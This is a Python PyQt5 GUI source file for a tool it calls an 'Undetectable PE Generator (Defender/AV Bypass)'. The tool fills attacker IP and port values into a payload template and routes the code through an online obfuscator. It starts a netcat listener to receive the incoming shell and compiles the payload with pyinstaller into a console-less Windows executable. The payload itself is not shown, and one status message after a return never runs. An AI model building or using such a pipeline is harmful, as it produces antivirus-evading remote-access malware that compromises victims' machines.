import os
import webbrowser
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
import sys
import socket
import re
import subprocess


class AnimatedBanner(QLabel):
    def __init__(self, text, parent=None):
        super().__init__(parent)
        self.full_text = text
        self.index = 0
        self.setStyleSheet("""
            color: #2ecc71;
            font-family: 'Consolas';
            font-weight: bold;
            font-size: 14px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 5px;
            padding: 10px;
        """)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_text)
        self.timer.start(50)

    def update_text(self):
        if self.index <= len(self.full_text):
            self.setText(self.full_text[:self.index])
            self.index += 1
        else:
            self.timer.stop()


class GradientFrame(QFrame):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumHeight(5)
        
    def paintEvent(self, event):
        painter = QPainter(self)
        gradient = QLinearGradient(0, 0, self.width(), 0)
        gradient.setColorAt(0, QColor("#3498db"))
        gradient.setColorAt(0.5, QColor("#2ecc71"))
        gradient.setColorAt(1, QColor("#9b59b6"))
        painter.fillRect(event.rect(), gradient)


def window():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    # Custom dark theme palette
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(30, 30, 30))
    palette.setColor(QPalette.WindowText, Qt.white)
    palette.setColor(QPalette.Base, QColor(40, 40, 40))
    palette.setColor(QPalette.AlternateBase, QColor(50, 50, 50))
    palette.setColor(QPalette.ToolTipBase, Qt.white)
    palette.setColor(QPalette.ToolTipText, Qt.white)
    palette.setColor(QPalette.Text, Qt.white)
    palette.setColor(QPalette.Button, QColor(60, 60, 60))
    palette.setColor(QPalette.ButtonText, Qt.white)
    palette.setColor(QPalette.BrightText, Qt.red)
    palette.setColor(QPalette.Highlight, QColor("#2ecc71"))
    palette.setColor(QPalette.HighlightedText, Qt.black)
    app.setPalette(palette)

    # Window
    w = QWidget()
    w.setWindowTitle('ByDeF - Undetectable PE Generator (Defender/AV Bypass) - @40sp3l')
    w.setWindowIcon(QIcon("icon.png"))
    w.setGeometry(300, 100, 850, 700)
    w.setMinimumSize(800, 650)

    # Main layout
    main_layout = QVBoxLayout()
    main_layout.setContentsMargins(15, 15, 15, 15)
    main_layout.setSpacing(15)

    # Banner
    banner_text = """
██████╗ ██╗   ██╗██████╗ ███████╗███████╗███████╗
██╔══██╗██║   ██║██╔══██╗██╔════╝██╔════╝██╔════╝
██████╔╝██║   ██║██████╔╝█████╗  █████╗  ███████╗
██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██╔══╝  ╚════██║
██║     ╚██████╔╝██║     ███████╗███████╗███████║
╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚══════╝
    """
    banner = AnimatedBanner(banner_text)
    banner.setAlignment(Qt.AlignCenter)
    main_layout.addWidget(banner)

    # Gradient separator
    separator = GradientFrame()
    separator.setFixedHeight(3)
    main_layout.addWidget(separator)

    # Form layout
    form_layout = QFormLayout()
    form_layout.setContentsMargins(20, 10, 20, 10)
    form_layout.setVerticalSpacing(15)
    form_layout.setHorizontalSpacing(20)

    # Custom styles
    label_style = """
    QLabel {
        font-weight: bold;
        color: #ecf0f1;
        font-size: 14px;
        padding: 3px 0;
    }
    """
    
    input_style = """
    QLineEdit, QTextEdit {
        background-color: #2c3e50;
        color: #ecf0f1;
        border: 1px solid #34495e;
        border-radius: 4px;
        padding: 8px;
        font-size: 13px;
        selection-background-color: #3498db;
    }
    QLineEdit:focus, QTextEdit:focus {
        border: 1px solid #3498db;
    }
    """
    
    button_style = """
    QPushButton {
        background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                        stop:0 #3498db, stop:0.5 #2ecc71, stop:1 #9b59b6);
        color: black;
        font-weight: bold;
        border: none;
        border-radius: 5px;
        padding: 10px;
        font-size: 13px;
        min-width: 120px;
    }
    QPushButton:hover {
        background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                        stop:0 #2980b9, stop:0.5 #27ae60, stop:1 #8e44ad);
    }
    QPushButton:pressed {
        background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                        stop:0 #1a5276, stop:0.5 #219653, stop:1 #7d3c98);
    }
    """
    
    # LHOST
    lhost_label = QLabel("LHOST:")
    lhost_label.setStyleSheet(label_style)
    inp = QLineEdit()
    inp.setPlaceholderText("Enter your IP address")
    inp.setStyleSheet(input_style)

    # LPORT
    lport_label = QLabel("LPORT:")
    lport_label.setStyleSheet(label_style)
    port = QLineEdit()
    port.setPlaceholderText("Enter port number")
    port.setStyleSheet(input_style)

    # Payload Name
    name_label = QLabel("Payload Name:")
    name_label.setStyleSheet(label_style)
    name = QLineEdit()
    name.setPlaceholderText("Enter output filename")
    name.setStyleSheet(input_style)

    # Add form fields
    form_layout.addRow(lhost_label, inp)
    form_layout.addRow(lport_label, port)
    form_layout.addRow(name_label, name)

    # Button grid
    button_grid = QGridLayout()
    button_grid.setSpacing(15)
    button_grid.setContentsMargins(0, 10, 0, 10)

    # Buttons with icons
    replace_btn = QPushButton(' Replace Values')
    replace_btn.setIcon(QIcon.fromTheme("system-run"))
    replace_btn.setStyleSheet(button_style)

    obfuscate_btn = QPushButton(' Obfuscate Code')
    obfuscate_btn.setIcon(QIcon.fromTheme("applications-other"))
    obfuscate_btn.setStyleSheet(button_style)

    nc_listener_btn = QPushButton(' Start NC Listener')
    nc_listener_btn.setIcon(QIcon.fromTheme("network-wired"))
    nc_listener_btn.setStyleSheet(button_style)

    compile_btn = QPushButton(' Compile Payload')
    compile_btn.setIcon(QIcon.fromTheme("applications-other"))
    compile_btn.setStyleSheet(button_style)

    write_btn = QPushButton(' Write to File')
    write_btn.setIcon(QIcon.fromTheme("document-save"))
    write_btn.setStyleSheet(button_style)

    # Add buttons to grid
    button_grid.addWidget(replace_btn, 0, 0)
    button_grid.addWidget(obfuscate_btn, 0, 1)
    button_grid.addWidget(nc_listener_btn, 1, 0)
    button_grid.addWidget(compile_btn, 1, 1)
    button_grid.addWidget(write_btn, 2, 0, 1, 2)

    # Style all buttons
    for btn in [replace_btn, obfuscate_btn, nc_listener_btn, compile_btn, write_btn]:
        btn.setCursor(Qt.PointingHandCursor)

    # Output Display
    output_box = QTextEdit()
    output_box.setReadOnly(True)
    output_box.setStyleSheet("""
        QTextEdit {
            background-color: #2c3e50;
            color: #ecf0f1;
            border: 1px solid #34495e;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Consolas';
            font-size: 12px;
        }
    """)
    output_box.setFixedHeight(150)

    # Status bar
    status_bar = QStatusBar()
    status_bar.setStyleSheet("""
        QStatusBar {
            background-color: #2c3e50;
            color: #bdc3c7;
            border-top: 1px solid #34495e;
            font-size: 11px;
        }
    """)
    status_bar.showMessage("Ready")

    # Add everything to main layout
    main_layout.addLayout(form_layout)
    main_layout.addLayout(button_grid)
    main_layout.addWidget(output_box)
    main_layout.addWidget(status_bar)

    w.setLayout(main_layout)
    
    # Center window
    frame_geo = w.frameGeometry()
    screen = QApplication.desktop().screenNumber(QApplication.desktop().cursor().pos())
    center_point = QApplication.desktop().screenGeometry(screen).center()
    frame_geo.moveCenter(center_point)
    w.move(frame_geo.topLeft())

    # -------------------------------
    # ORIGINAL FUNCTIONALITY - UNTOUCHED
    # -------------------------------
    
    # Validation
    def is_valid_ip(ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def is_valid_port(port):
        return port.isdigit() and 1 <= int(port) <= 65535

    # Replace
    def replace_values():
        new_host = inp.text().strip()
        new_port = port.text().strip()

        if not is_valid_ip(new_host):
            output_box.append("[!] Invalid IP")
            return

        if not is_valid_port(new_port):
            output_box.append("[!] Invalid PORT")
            return

        try:
            with open("payload.txt", "r") as file:
                content = file.read()

            content = re.sub(r"LHOST=.*", f"LHOST={new_host}", content)
            content = re.sub(r"LPORT=.*", f"LPORT={new_port}", content)

            with open("payload.txt", "w") as file:
                file.write(content)

            output_box.append("[+] Values replaced successfully!")
        except Exception as e:
            output_box.append(f"[!] Error: {e}")

    # Obfuscate
    def obfuscate_action():
        try:
            with open("payload.txt", "r") as file:
                content = file.read()

            # Modify LHOST line only in-memory (add quotes)
            modified_content = re.sub(r'LHOST=([0-9\.]+)', r'LHOST="\1"', content)

            clipboard = QApplication.clipboard()
            clipboard.setText(modified_content)

            webbrowser.open("https://freecodingtools.org/tools/obfuscator/python")
            output_box.append("[+] Modified code copied to clipboard and browser opened (LHOST as string).")

        except Exception as e:
            output_box.append(f"[!] Error: {e}")

    # NC Listener
    def start_nc_listener():
        try:
            with open("payload.txt", "r") as file:
                content = file.read()

            match = re.search(r"LPORT=(\d+)", content)
            if not match:
                output_box.append("[!] LPORT Missing")
                return

            port = match.group(1)
            subprocess.Popen(f'start cmd /k nc.exe -lvnp {port}', shell=True)
            output_box.append(f"[+] NC Listener started on port {port}")
        except Exception as e:
            output_box.append(f"[!] Error: {e}")

    # Dummy compile
    def compile_payload():
        payload_name_value = name.text().strip()

        if not payload_name_value:
           output_box.append("[!] Please set the Payload Name before compiling.")
           return

        if not os.path.exists("comp.py"):
            output_box.append("[!] comp.py not found. Please generate the payload first.")
            return

            output_box.append("[*] Compiling... Please wait. This might take a moment.")

        try:
        # Build the command
            cmd = [
                "pyinstaller",
                "--onefile",           # no folders
                "--noconsole",         # no console window (optional - use only if GUI app)
                "--name", payload_name_value,
                "comp.py"
            ]

            # Run the command
            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Check result
            if process.returncode == 0:
                exe_path = os.path.join("dist", f"{payload_name_value}.exe")
                if os.path.exists(exe_path):
                    # Move .exe to current directory
                    final_path = os.path.join(os.getcwd(), f"{payload_name_value}.exe")
                    os.replace(exe_path, final_path)
                    output_box.append(f"[+] Compilation completed successfully: {payload_name_value}.exe")

                # Clean up build files
                for folder in ["build", "__pycache__", "dist"]:
                    if os.path.exists(folder):
                        try:
                            if os.path.isdir(folder):
                                subprocess.call(f'rmdir /S /Q {folder}', shell=True)
                        except Exception as e:
                            output_box.append(f"[!] Cleanup failed for {folder}: {e}")

                spec_file = f"{payload_name_value}.spec"
                if os.path.exists(spec_file):
                    os.remove(spec_file)

            else:
                output_box.append("[!] Compilation failed. Check your setup.")
                output_box.append(process.stderr)

        except Exception as e:
            output_box.append(f"[!] Compilation error: {e}")

    # Write clipboard content to comp.py
    def write_payload():
        try:
            clipboard = QApplication.clipboard()
            content = clipboard.text()

            if not content.strip():
                output_box.append("[!] Clipboard is empty.")
                return

            with open("comp.py", "w", encoding='utf-8') as f:
                f.write(content)

            output_box.append("[+] Clipboard content written to comp.py")
        except Exception as e:
            output_box.append(f"[!] Failed to write to file: {e}")

    # Connect buttons to their original functions
    replace_btn.clicked.connect(replace_values)
    obfuscate_btn.clicked.connect(obfuscate_action)
    nc_listener_btn.clicked.connect(start_nc_listener)
    compile_btn.clicked.connect(compile_payload)
    write_btn.clicked.connect(write_payload)

    w.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    window()